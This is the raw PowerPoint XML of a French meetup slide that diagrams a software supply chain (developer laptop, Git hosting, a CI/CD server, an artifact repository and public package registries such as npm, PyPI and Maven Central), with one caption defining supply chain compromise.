      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43" name="ZoneTexte 42">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{79D945CF-BDAB-6DFA-9F0D-50ECC72C4CA8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3020822" y="4590988"/>
            <a:ext cx="1535517" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>Bitbucket</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>...</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47" name="ZoneTexte 46">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7CC849F3-52D5-3501-B8A3-3FA96B3DEC7E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7573907" y="2240499"/>
            <a:ext cx="1716740" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>repo1.maven.org</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48" name="ZoneTexte 47">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1B905B87-A304-88D7-8883-8141D35238D7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7573907" y="1948018"/>
            <a:ext cx="1091060" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>npmjs.com</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="49" name="ZoneTexte 48">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CD13EE6B-CE3A-C5D8-A033-03EDE5AD07F8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7573907" y="1655536"/>
            <a:ext cx="1091060" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>pypi.org</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="ZoneTexte 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8EB9B24B-90D0-E000-2BDB-ADB44D7F0F4D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3081463" y="5461896"/>
            <a:ext cx="6105524" cy="738664"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The defining feature isn't where the payload lands; it's that the compromise enters through a trusted third party or the pipeline rather than through a flaw in your own application logic.</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Accolade ouvrante 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6DD4C400-1D23-3934-7D5A-121F74798C46}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="287865" y="3436287"/>
            <a:ext cx="432000" cy="1656000"/>
          </a:xfrm>
          <a:prstGeom prst="leftBrace">
            <a:avLst>
              <a:gd name="adj1" fmla="val 23855"/>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fermante 8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{31EC86B3-E263-09CC-3635-678F311EA614}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9244181" y="3429000"/>
            <a:ext cx="432000" cy="1656000"/>
          </a:xfrm>
          <a:prstGeom prst="rightBrace">
            <a:avLst>
              <a:gd name="adj1" fmla="val 2597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127810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DD5CAEAC-5FF1-49A9-FB33-1EB6EC934451}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7573907" y="3608499"/>
            <a:ext cx="1620000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0" err="1"/>
              <a:t>Artifact</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0"/>
              <a:t> repository</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="10" name="Picture 2" descr="Laptop - Free computer icons">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F0A7F49D-CEDA-A69C-E795-2E0B1BB9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907" y="398018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omputer User Icon SVG Vector &amp; PNG Free Download | UXWing">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1FA229DC-64A1-3C28-0A67-A9E668AB0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96" y="3928753"/>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510B108-4448-584B-98DE-4F0FEBAF8C7C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="708995" y="3608499"/>
            <a:ext cx="162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sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="ZoneTexte 12">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{312A2F29-67DD-5968-4606-374A40927116}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2997299" y="3608499"/>
            <a:ext cx="1620000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0"/>
              <a:t>Git </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0" err="1"/>
              <a:t>hosting</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1400" u="sng" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="ZoneTexte 13">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4197F436-9B68-5943-F8EA-619CACCE74C6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5285603" y="3608499"/>
            <a:ext cx="1620000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0"/>
              <a:t>CI/CD server</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="17" name="Picture 4" descr="Icônes, logos, symboles Server– Téléchargement gratuit aux ...">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8B027055-1F12-8023-5728-A04C88DF962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4257299"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18" name="Group 62 Outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E64E33E5-899D-9422-4876-21845D2182DE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="696378"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9" name="Group 62 Outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DD0B1EE3-0B75-71F2-0975-A3BB67206273}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="298330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0" name="Group 62 Outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3FF6CCA8-9822-17B7-026C-B8E4A20C950A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5270226"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1" name="Group 62 Outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{222F2DA7-4EA3-01EA-6572-25BE2BA803C5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7557150"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23" name="Picture 4" descr="Icônes, logos, symboles Server– Téléchargement gratuit aux ...">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{14DE835D-AEEA-9024-0C6C-E33AB13F7B1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6545603"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cônes, logos, symboles Server– Téléchargement gratuit aux ...">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E384E84D-A866-8821-5661-9158148958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26" name="Nuage 25">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{95C94FBA-D78F-B992-4290-F90726B610D9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4796118" y="304956"/>
            <a:ext cx="7395882" cy="287121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D5FC046C-A840-4AA5-F27C-908077766201}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="696378" y="3319615"/>
            <a:ext cx="10875694"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A1DB742D-1D77-160D-7D4B-4D00C049810A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7573907" y="1258737"/>
            <a:ext cx="1620000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0"/>
              <a:t>Public repositories</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Group 62 Outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F1F58C00-6975-1811-4EFB-5D8F411A1FF6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="755715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31" name="Picture 4" descr="Icônes, logos, symboles Server– Téléchargement gratuit aux ...">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{29829A64-D2D0-2417-77BB-54DDB5926A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a:xfrm>
            <a:off x="472251" y="349793"/>
            <a:ext cx="11016000" cy="257220"/>
          </a:xfrm>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t>Le périmètre et les technos de ce meetup 1/2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" u="sng" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="ZoneTexte 34">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9BEF6735-DB9E-FCAE-86FB-A5E1A3C13258}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7566052" y="4028536"/>
            <a:ext cx="1152000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>Nexus</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="ZoneTexte 39">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{17BCE7EA-6D03-5781-F5DB-C7F35713AA75}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5281842" y="4054288"/>
            <a:ext cx="1535517" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>GitHub actions</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="ZoneTexte 41">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{00E746E7-6ECE-9DDF-C858-4D96C1B39B44}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3010663" y="4073153"/>
            <a:ext cx="1152000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>GiHub</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48" name="ZoneTexte 47">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1B905B87-A304-88D7-8883-8141D35238D7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7573907" y="1683858"/>
            <a:ext cx="1091060" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>npmjs.com</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="ZoneTexte 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8EB9B24B-90D0-E000-2BDB-ADB44D7F0F4D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3081463" y="5461896"/>
            <a:ext cx="6105524" cy="738664"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The defining feature isn't where the payload lands; it's that the compromise enters through a trusted third party or the pipeline rather than through a flaw in your own application logic.</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Accolade ouvrante 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6DD4C400-1D23-3934-7D5A-121F74798C46}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="287865" y="3436287"/>
            <a:ext cx="432000" cy="1656000"/>
          </a:xfrm>
          <a:prstGeom prst="leftBrace">
            <a:avLst>
              <a:gd name="adj1" fmla="val 23855"/>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fermante 8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{31EC86B3-E263-09CC-3635-678F311EA614}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9244181" y="3429000"/>
            <a:ext cx="432000" cy="1656000"/>
          </a:xfrm>
          <a:prstGeom prst="rightBrace">
            <a:avLst>
              <a:gd name="adj1" fmla="val 2597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2" name="Picture 8" descr="npm Icon SVG Vector &amp; PNG Free Download | UXWing">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8948DBDF-686A-9810-091F-ED575D3646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5827" y="1995715"/>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onatype Nexus - Opsera">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{753B9988-C5B2-A130-1A74-7E62D3D4BC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1032" y="4355759"/>
            <a:ext cx="360000" cy="3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4663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DD5CAEAC-5FF1-49A9-FB33-1EB6EC934451}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7573907" y="3608499"/>
            <a:ext cx="1620000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0" err="1"/>
              <a:t>Artifact</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0"/>
              <a:t> repository</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="10" name="Picture 2" descr="Laptop - Free computer icons">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F0A7F49D-CEDA-A69C-E795-2E0B1BB9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907" y="398018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omputer User Icon SVG Vector &amp; PNG Free Download | UXWing">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1FA229DC-64A1-3C28-0A67-A9E668AB0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96" y="3928753"/>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510B108-4448-584B-98DE-4F0FEBAF8C7C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="708995" y="3608499"/>
            <a:ext cx="162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sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="ZoneTexte 12">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{312A2F29-67DD-5968-4606-374A40927116}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2997299" y="3608499"/>
            <a:ext cx="1620000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0"/>
              <a:t>Git </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0" err="1"/>
              <a:t>hosting</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1400" u="sng" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="ZoneTexte 13">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4197F436-9B68-5943-F8EA-619CACCE74C6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5285603" y="3608499"/>
            <a:ext cx="1620000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0"/>
              <a:t>CI/CD server</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="17" name="Picture 4" descr="Icônes, logos, symboles Server– Téléchargement gratuit aux ...">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8B027055-1F12-8023-5728-A04C88DF962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4257299"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18" name="Group 62 Outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E64E33E5-899D-9422-4876-21845D2182DE}"/>
              </a:ext>
